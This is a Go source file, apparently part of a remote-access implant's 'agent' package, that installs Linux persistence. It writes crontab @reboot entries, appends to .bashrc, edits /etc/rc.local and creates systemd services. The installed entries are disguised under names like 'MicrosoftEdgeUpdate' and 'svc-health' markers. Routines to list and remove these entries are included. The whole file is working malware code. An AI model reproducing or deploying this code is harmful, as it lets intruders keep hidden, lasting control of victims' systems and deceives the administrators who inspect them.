//go:build !windows

package agent

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// persistMethod installs persistence using the given method.
// Methods: crontab, bashrc, rc.local, systemd, profile
func persistMethod(method, cmd, name string) (string, error) {
	switch strings.ToLower(method) {
	case "crontab", "cron":
		return persistCrontab(cmd, name)
	case "bashrc", "bash_profile", "profile":
		return persistBashrc(cmd, name)
	case "rc.local", "rclocal":
		return persistRCLocal(cmd, name)
	case "systemd", "service":
		return persistSystemd(cmd, name)
	case "rm", "remove", "uninstall":
		return persistRemoveLinux(name)
	case "enum", "check", "list":
		return persistEnumLinux()
	default:
		return "", fmt.Errorf("unknown persistence method: %s (linux: crontab|bashrc|rc.local|systemd|enum)", method)
	}
}

func persistRemoveLinux(name string) (string, error) {
	if name == "" {
		name = "Updater"
	}
	var removed []string

	// Remove the user systemd unit, if present.
	home, _ := os.UserHomeDir()
	unit := filepath.Join(home, ".config", "systemd", "user", name+".service")
	if err := os.Remove(unit); err == nil {
		_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
		removed = append(removed, "systemd unit removed: "+name)
	}

	// Remove the marker line installed by persistCrontab. Do not rewrite the
	// crontab when it cannot be read or when no managed entry is present.
	if existing, err := exec.Command("crontab", "-l").Output(); err == nil {
		lines := strings.Split(string(existing), "\n")
		kept := lines[:0]
		for _, line := range lines {
			if strings.Contains(line, "# svc-health:"+name) ||
				(strings.Contains(line, "# svc-health") && name == "Updater") {
				continue
			}
			kept = append(kept, line)
		}
		updated := strings.Join(kept, "\n")
		if updated != string(existing) {
			c := exec.Command("crontab", "-")
			c.Stdin = strings.NewReader(updated)
			if err := c.Run(); err == nil {
				removed = append(removed, "crontab entry removed: "+name)
			}
		}
	}

	if len(removed) == 0 {
		return "", fmt.Errorf("no persistence entries found for name: %s", name)
	}
	return "[+] " + strings.Join(removed, "\n[+] "), nil
}

// persistEnumLinux checks all known Linux persistence mechanisms.
func persistEnumLinux() (string, error) {
	var sb strings.Builder
	sb.WriteString("[*] Scanning persistence mechanisms...\n")

	// Crontab
	sb.WriteString("\n[Crontab]\n")
	if out, err := exec.Command("crontab", "-l").Output(); err == nil && len(out) > 0 {
		sb.Write(out)
	} else {
		sb.WriteString("  (empty)\n")
	}

	// ~/.bashrc
	sb.WriteString("\n[~/.bashrc]\n")
	home, _ := os.UserHomeDir()
	if data, err := os.ReadFile(filepath.Join(home, ".bashrc")); err == nil {
		found := false
		for i, l := range strings.Split(string(data), "\n") {
			if strings.Contains(l, "svc-health") {
				fmt.Fprintf(&sb, "  line %d: %s\n", i+1, l)
				found = true
			}
		}
		if !found {
			sb.WriteString("  (no entries)\n")
		}
	} else {
		sb.WriteString("  (not found)\n")
	}

	// /etc/rc.local
	sb.WriteString("\n[/etc/rc.local]\n")
	if data, err := os.ReadFile("/etc/rc.local"); err == nil {
		found := false
		for i, l := range strings.Split(string(data), "\n") {
			if strings.Contains(l, "svc-health") {
				fmt.Fprintf(&sb, "  line %d: %s\n", i+1, l)
				found = true
			}
		}
		if !found {
			sb.WriteString("  (no entries)\n")
		}
	} else {
		sb.WriteString("  (not found)\n")
	}

	// Systemd user services
	sb.WriteString("\n[Systemd user services (~/.config/systemd/user/)]\n")
	svcDir := filepath.Join(home, ".config", "systemd", "user")
	if entries, err := os.ReadDir(svcDir); err == nil {
		found := false
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".service") {
				sb.WriteString("  " + e.Name() + "\n")
				found = true
			}
		}
		if !found {
			sb.WriteString("  (none)\n")
		}
	} else {
		sb.WriteString("  (none)\n")
	}

	// Systemd system services (non-standard)
	sb.WriteString("\n[Systemd system services (/etc/systemd/system/)]\n")
	standardPrefixes := []string{"systemd", "dbus", "network", "getty", "ssh", "cron", "cups", "avahi", "udev"}
	if entries, err := os.ReadDir("/etc/systemd/system"); err == nil {
		found := false
		for _, e := range entries {
			n := e.Name()
			if !strings.HasSuffix(n, ".service") {
				continue
			}
			suspect := true
			for _, p := range standardPrefixes {
				if strings.HasPrefix(n, p) {
					suspect = false
					break
				}
			}
			if suspect {
				sb.WriteString("  " + n + "\n")
				found = true
			}
		}
		if !found {
			sb.WriteString("  (none non-standard)\n")
		}
	} else {
		sb.WriteString("  (not readable)\n")
	}

	return sb.String(), nil
}

func persistCrontab(cmd, name string) (string, error) {
	// Add @reboot entry via crontab -l | crontab -
	existing, _ := exec.Command("crontab", "-l").Output()
	if name == "" {
		name = "Updater"
	}
	entry := fmt.Sprintf("@reboot %s # svc-health:%s\n", cmd, name)
	if strings.Contains(string(existing), cmd) {
		return "already in crontab", nil
	}
	newCron := string(existing) + entry
	c := exec.Command("crontab", "-")
	c.Stdin = strings.NewReader(newCron)
	if out, err := c.CombinedOutput(); err != nil {
		return "", fmt.Errorf("crontab: %v %s", err, out)
	}
	return fmt.Sprintf("[+] crontab entry added: %s", entry), nil
}

func persistBashrc(cmd, _ string) (string, error) {
	home, _ := os.UserHomeDir()
	target := filepath.Join(home, ".bashrc")
	marker := "# svc-health"
	data, _ := os.ReadFile(target)
	if strings.Contains(string(data), marker) {
		return "already in .bashrc", nil
	}
	entry := fmt.Sprintf("\n%s\n%s &\n", marker, cmd)
	f, err := os.OpenFile(target, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return "", err
	}
	defer f.Close()
	f.WriteString(entry)
	return fmt.Sprintf("[+] .bashrc entry added: %s", target), nil
}

func persistRCLocal(cmd, _ string) (string, error) {
	target := "/etc/rc.local"
	data, err := os.ReadFile(target)
	if err != nil {
		return "", fmt.Errorf("rc.local: %v", err)
	}
	marker := "# svc-health"
	if strings.Contains(string(data), marker) {
		return "already in rc.local", nil
	}
	// insert before "exit 0"
	content := strings.Replace(string(data), "exit 0", fmt.Sprintf("%s\n%s &\nexit 0", marker, cmd), 1)
	if err := os.WriteFile(target, []byte(content), 0755); err != nil {
		return "", err
	}
	return fmt.Sprintf("[+] rc.local entry added"), nil
}

func persistSystemd(cmd, name string) (string, error) {
	if name == "" {
		name = "MicrosoftEdgeUpdate"
	}
	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
`, name, cmd)
	path := fmt.Sprintf("/etc/systemd/system/%s.service", name)
	if err := os.WriteFile(path, []byte(unit), 0644); err != nil {
		// Try user systemd
		home, _ := os.UserHomeDir()
		path = filepath.Join(home, ".config/systemd/user", name+".service")
		os.MkdirAll(filepath.Dir(path), 0755)
		if err2 := os.WriteFile(path, []byte(unit), 0644); err2 != nil {
			return "", fmt.Errorf("systemd unit: %v / %v", err, err2)
		}
		exec.Command("systemctl", "--user", "enable", "--now", name).Run()
		return fmt.Sprintf("[+] user systemd service installed: %s", path), nil
	}
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "--now", name).Run()
	return fmt.Sprintf("[+] systemd service installed: %s", path), nil
}
